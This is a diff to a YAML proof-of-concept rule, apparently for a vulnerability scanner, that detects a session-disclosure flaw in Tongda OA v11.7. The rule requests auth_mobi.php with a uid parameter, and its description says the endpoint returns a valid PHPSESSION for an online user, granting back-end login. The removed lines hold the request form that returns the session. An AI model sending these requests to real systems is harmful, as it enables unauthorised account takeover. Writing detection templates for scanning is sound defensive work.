@@ -1,17 +1,13 @@
-name: poc-yaml-tongda-user-session-disclosure
+name: tongda-user-session-disclosure
 rules:
   - method: GET
-    path: /mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0
-    follow_redirects: false
-    expression: "true"
-
-  - method: POST
-    path: /general/userinfo.php?UID=1
-    follow_redirects: false
-    expression: |
-      response.status == 200 && response.body.bcontains(b"\"dept_name\":\"") && response.body.bcontains(b"\"online_flag\":") && response.headers["Content-Type"].contains("application/json")
-
+    path: /mobile/auth_mobi.php?isAvatar=1&uid=11121212121212&P_VER=0
+    expression: response.body.bcontains(b'RELOGIN') && response.status == 200
 detail:
-  author: kzaopa(https://github.com/kzaopa)
-  links:
-    - https://mp.weixin.qq.com/s/llyGEBRo0t-C7xOLMDYfFQ
+    author: kzaopa(https://github.com/kzaopa)
+    description: |
+        通达OA v11.7 中存在某接口查询在线用户，当用户在线时会返回 PHPSESSION使其可登录后台系统
+    links:
+        - http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.7%20auth_mobi.php%20%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.html
+        - https://www.cnblogs.com/T0uch/p/14475551.html
+        - https://s1xhcl.github.io/2021/03/13/%E9%80%9A%E8%BE%BEOA-v11-7-%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/
